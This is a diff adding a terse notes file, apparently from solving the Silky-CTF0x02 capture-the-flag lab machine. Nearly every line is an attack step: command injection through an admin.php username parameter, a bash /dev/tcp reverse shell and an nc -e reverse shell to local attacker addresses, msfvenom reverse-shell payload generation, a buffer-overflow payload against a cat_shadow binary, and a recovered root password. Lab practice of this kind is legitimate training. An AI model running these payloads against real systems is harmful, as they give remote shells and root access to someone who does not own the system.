@@ -1,0 +1,20 @@
+Linux Falscher Nutzernamen oder falsches Passwort , wenn uname & psw als daten
+http://192.168.1.105/admin.php?username=ls+-al&password=s = php-shell
+
+Linux Silky-CTF0x02 4.9.0-8-amd64 #1 SMP Debian 4.9.144-3.1 (2019-02-19) x86_64 GNU/Linux
+
+/bin/bash -i &> /dev/tcp/192.168.1.107/5555 0>&1
+
+./cat_shadow aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.107 LPORT=6666 -f elf >/tmp/shell
+
+bof eip at 68
+./cat_shadow $(python -c "print 'A' * 64 + '\x62\x59\x6c\x49'")
+
+
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.43.169 LPORT=4444 -f elf >/tmp/shell
+
+/bin/nc 192.168.43.169 5555 -e /bin/sh
+
+root password = greygrey
